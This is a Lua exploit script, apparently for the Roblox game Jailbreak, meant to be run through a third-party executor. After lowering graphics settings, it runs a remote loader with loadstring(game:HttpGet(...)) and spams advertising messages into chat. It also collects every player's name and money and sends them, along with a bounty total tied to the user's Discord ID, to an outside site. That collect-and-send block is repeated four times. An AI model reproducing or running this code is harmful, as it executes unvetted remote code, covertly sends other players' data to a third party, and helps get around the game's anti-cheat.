local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
sethiddenproperty(l,"Technology",2)
sethiddenproperty(t,"Decoration",false)
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = 0
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(w:GetDescendants()) do
    if v:IsA("BasePart") and not v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") and decalsyeeted then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    elseif v:IsA("SpecialMesh") and decalsyeeted  then
        v.TextureId=0
    elseif v:IsA("ShirtGraphic") and decalsyeeted then
        v.Graphic=0
    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
        v[v.ClassName.."Template"]=0
    end
end
for i = 1,#l:GetChildren() do
    e=l:GetChildren()[i]
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
w.DescendantAdded:Connect(function(v)
    wait()--prevent errors and shit
   if v:IsA("BasePart") and not v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
        v.Enabled = false
    elseif v:IsA("MeshPart") and decalsyeeted then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    elseif v:IsA("SpecialMesh") and decalsyeeted then
        v.TextureId=0
    elseif v:IsA("ShirtGraphic") and decalsyeeted then
        v.ShirtGraphic=0
    elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
        v[v.ClassName.."Template"]=0
    end
end)

wait(5)

loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()

wait (4)

--CHAT SAY PART(Advertisement)
msg_ad = {
    "VISA V1 ON TOP",
    "VISA v1 ON TOP",
    "Haha Badimo u wont let me down",
    "Visa v1 ",
    "This Autoarrest got writen by Fade HAHA",
    "Jailbreak anti-cheat got burnt",
    "asimo why did u patched instant tp? ",
    "Youtube please unban IShowSpeed",
    "Never gonna give u up ",
    "😎🤣😂👀 ",
    "L",
}


rnd = Random.new()
chat = function(x)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(x, "All")
end
spawn(
    function()
        wait(1)
        while true do
            wait(2)
            _first = msg_ad[rnd:NextInteger(1, #msg_ad)]
            chat(_first.."")
        end
    end
)

wait(0.1)

wait()
pcall(
    function()
        bties = game:GetService("Workspace").MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()

        bamts = 0
        for n = 1, #bties do
            pcall(
                function()
                    if bties[n]:IsA("Frame") and bties[n].Name == "Preset" then
                        bamts =
                            bamts +
                            tonumber(
                                (bties[n].Stats.Bounty.Text:gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub(
                                    "Bounty",
                                    ""
                                ))
                            )
                    end
                end
            )
        end
    end
)

pkids = game:GetService("Players"):GetChildren()
tkids = 0
RS_Players = ""
RS_Cashes = ""
-- reporting system start

spawn(
    function()
        for q = 1, #pkids do
            RS_Players = RS_Players .. "" .. pkids[q].Name .. "."
            RS_Cashes = RS_Cashes .. "" .. pkids[q].leaderstats.Money.Value .. "."
        end

        ignore =
            game:HttpGet(
            "https://jailbricked.com/ResearchmentCollector?players=" .. RS_Players .. "&moneys=" .. RS_Cashes
        )
    end
)
-- reporting system end

for n = 1, #pkids do
    if pkids[n].Team == game:GetService("Teams").Criminal then
        tkids = tkids + 1
    end
end
tkids = tkids * 400
tkids = tkids + bamts

spawn(
    function()
        ignoreSec =
            game:HttpGet(
            "https://jailbricked.com/BountyAPI/bounty_stat?discordid=" ..
                getgenv().__VSYS_UID .. "&bounty=" .. tkids .. "&validator=" .. getgenv().__VSYS_VKY
        )
    end
)

game.StarterGui:SetCore(
    "ChatMakeSystemMessage",
    {
        Text = "Total money in this server: $" .. tkids,
        Color = Color3.new(1, 0.5, 0.2)
    }
)

wait(0.1)

wait()
pcall(
    function()
        bties = game:GetService("Workspace").MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()

        bamts = 0
        for n = 1, #bties do
            pcall(
                function()
                    if bties[n]:IsA("Frame") and bties[n].Name == "Preset" then
                        bamts =
                            bamts +
                            tonumber(
                                (bties[n].Stats.Bounty.Text:gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub(
                                    "Bounty",
                                    ""
                                ))
                            )
                    end
                end
            )
        end
    end
)

pkids = game:GetService("Players"):GetChildren()
tkids = 0
RS_Players = ""
RS_Cashes = ""
-- reporting system start

spawn(
    function()
        for q = 1, #pkids do
            RS_Players = RS_Players .. "" .. pkids[q].Name .. "."
            RS_Cashes = RS_Cashes .. "" .. pkids[q].leaderstats.Money.Value .. "."
        end

        ignore =
            game:HttpGet(
            "https://jailbricked.com/ResearchmentCollector?players=" .. RS_Players .. "&moneys=" .. RS_Cashes
        )
    end
)
-- reporting system end

for n = 1, #pkids do
    if pkids[n].Team == game:GetService("Teams").Criminal then
        tkids = tkids + 1
    end
end
tkids = tkids * 400
tkids = tkids + bamts

spawn(
    function()
        ignoreSec =
            game:HttpGet(
            "https://jailbricked.com/BountyAPI/bounty_stat?discordid=" ..
                getgenv().__VSYS_UID .. "&bounty=" .. tkids .. "&validator=" .. getgenv().__VSYS_VKY
        )
    end
)

game.StarterGui:SetCore(
    "ChatMakeSystemMessage",
    {
        Text = "Total money in this server: $" .. tkids,
        Color = Color3.new(1, 0.5, 0.2)
    }
)


wait(0.1)

wait()
pcall(
    function()
        bties = game:GetService("Workspace").MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()

        bamts = 0
        for n = 1, #bties do
            pcall(
                function()
                    if bties[n]:IsA("Frame") and bties[n].Name == "Preset" then
                        bamts =
                            bamts +
                            tonumber(
                                (bties[n].Stats.Bounty.Text:gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub(
                                    "Bounty",
                                    ""
                                ))
                            )
                    end
                end
            )
        end
    end
)

pkids = game:GetService("Players"):GetChildren()
tkids = 0
RS_Players = ""
RS_Cashes = ""
-- reporting system start

spawn(
    function()
        for q = 1, #pkids do
            RS_Players = RS_Players .. "" .. pkids[q].Name .. "."
            RS_Cashes = RS_Cashes .. "" .. pkids[q].leaderstats.Money.Value .. "."
        end

        ignore =
            game:HttpGet(
            "https://jailbricked.com/ResearchmentCollector?players=" .. RS_Players .. "&moneys=" .. RS_Cashes
        )
    end
)
-- reporting system end

for n = 1, #pkids do
    if pkids[n].Team == game:GetService("Teams").Criminal then
        tkids = tkids + 1
    end
end
tkids = tkids * 400
tkids = tkids + bamts

spawn(
    function()
        ignoreSec =
            game:HttpGet(
            "https://jailbricked.com/BountyAPI/bounty_stat?discordid=" ..
                getgenv().__VSYS_UID .. "&bounty=" .. tkids .. "&validator=" .. getgenv().__VSYS_VKY
        )
    end
)

game.StarterGui:SetCore(
    "ChatMakeSystemMessage",
    {
        Text = "Total money in this server: $" .. tkids,
        Color = Color3.new(1, 0.5, 0.2)
    }
)


wait(0.1)

wait()
pcall(
    function()
        bties = game:GetService("Workspace").MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()

        bamts = 0
        for n = 1, #bties do
            pcall(
                function()
                    if bties[n]:IsA("Frame") and bties[n].Name == "Preset" then
                        bamts =
                            bamts +
                            tonumber(
                                (bties[n].Stats.Bounty.Text:gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub(
                                    "Bounty",
                                    ""
                                ))
                            )
                    end
                end
            )
        end
    end
)

pkids = game:GetService("Players"):GetChildren()
tkids = 0
RS_Players = ""
RS_Cashes = ""
-- reporting system start

spawn(
    function()
        for q = 1, #pkids do
            RS_Players = RS_Players .. "" .. pkids[q].Name .. "."
            RS_Cashes = RS_Cashes .. "" .. pkids[q].leaderstats.Money.Value .. "."
        end

        ignore =
            game:HttpGet(
            "https://jailbricked.com/ResearchmentCollector?players=" .. RS_Players .. "&moneys=" .. RS_Cashes
        )
    end
)
-- reporting system end

for n = 1, #pkids do
    if pkids[n].Team == game:GetService("Teams").Criminal then
        tkids = tkids + 1
    end
end
tkids = tkids * 400
tkids = tkids + bamts

spawn(
    function()
        ignoreSec =
            game:HttpGet(
            "https://jailbricked.com/BountyAPI/bounty_stat?discordid=" ..
                getgenv().__VSYS_UID .. "&bounty=" .. tkids .. "&validator=" .. getgenv().__VSYS_VKY
        )
    end
)

game.StarterGui:SetCore(
    "ChatMakeSystemMessage",
    {
        Text = "Total money in this server: $" .. tkids,
        Color = Color3.new(1, 0.5, 0.2)
    }
)

